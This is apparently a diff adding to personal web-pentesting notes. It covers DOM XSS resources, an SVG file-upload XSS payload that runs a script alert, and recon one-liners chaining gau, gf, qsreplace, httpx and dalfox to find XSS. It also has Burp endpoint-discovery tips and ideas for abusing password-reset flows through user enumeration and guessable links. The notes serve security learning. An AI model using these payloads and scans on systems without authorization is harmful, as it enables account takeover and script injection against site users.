@@ -63,6 +63,12 @@
 
 #### if <font color="red">DOM </font> :
 
+for domxss check this link out :
+- [ ] https://github.com/wisec/domxsswiki/wiki
+training :
+- [ ] https://domgo.at/cxss/intro
+
+
 #### if <font color="red">Stored</font> : 
 
 ### <font color="red">Mutation XSS</font> :
@@ -85,7 +91,26 @@
 `<p title=" 
 #### was ignored and the img onerror became valid.
 
+#### <font color="red">XSS through File uplaod</font>:
 
+XSS through svg file : since svg files can contain JavaScript, we use the following payload:
+
+payload:
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "www.
+w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="www.w3.
+org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill=
+"#009900" stroke="#004400"/>
+<script type="text/javascript">
+alert(document.domain);
+</script>
+</svg>
+```
+
+XSS through METADATA :
 
 ## <font color="red"> Haunt</font>:
 #### you can use <font color="red"> GAU</font> for finding the endpoints And use <font color="red">KATANA</font> crawler for spidering the site and finding more useful endpoints.
@@ -100,6 +125,21 @@
 	cat XSS.txt | Gxss -p khXSS -o Xss_Ref.txt
 #### here we have two options either use manual testing or use an xss automation tool and confirm the result mannually (for automation we can use the tool called <font color="red">dalfox</font>)
 	dalfox file Xss_Ref.txt -o vulnerable_xss.txt
+
+#### for checking all paths find at once automatically you could use :
+```
+echo "example.com" | gau | gf xss | qsreplace '<xss' | httpx -mr '<xss'
+```
+
+#### for endpoint discovery using burp suite you could use the `Engagement tools > discovery content > Control > sessino is running ` then after content discovery you can right click on the target then `Engagement tools > Analyze target > Dynamic urls ` by copying all those urls and paste it into a file 
+#### sometimes the vulnerable endpoint could be in the static urls (remember bio)
+
+#### after getting the paths for deduplicating the urls you could use the tool <font color="red">uddup</font>
+
+
+//36 S4-2
+![](./statics/XSS-Hunting-Methodology.png)
+
 ### <font color="red"> Angular (without html )</font >:
 #### <font color="red">Note:</font > Angular expressions can't do much harm on their own, but when combined with a sandbox escape we can execute arbitrary JavaScript and do some serious damage.
 #### The following two snippets show the essence of the vulnerability. The first page dynamically embeds user input, but is not vulnerable to XSS because it uses htmlspecialchars to HTML encode the input:
@@ -4437,4 +4477,29 @@ Note : use logger++ in your pentesting it helps you alot
 
 
 ![](./statics/PSP1.jpg)
+
+
+# <font color="red"> Reset password</font>
+
+
+
+![](./statics/resetpasswd-1.png)
+
+
+
+### in this functionality of the web app if the errors specify the existence of a username or email we can perform user enumeration test.
+
+
+
+some application do have questions in order to send an email to change password . allways keep in your mind that what would happend if you change request method or what would happen if you send null as input for these questions 
+
+
+##### sometimes the reset password functionality may have some issues for example imagine after specifying the username an email may have send to the email of the owner of that username and inside the email it has a link for reseting the password for the user and the link may be guessable.
+##### by testing multiple times you can tell if the links are guessable or not .
+
+##### by guessing the path and testing the application you could sometimes place yourself as admin.
+
+
+# <font color="red">JSONP (xss inclusion)</font>
+
 
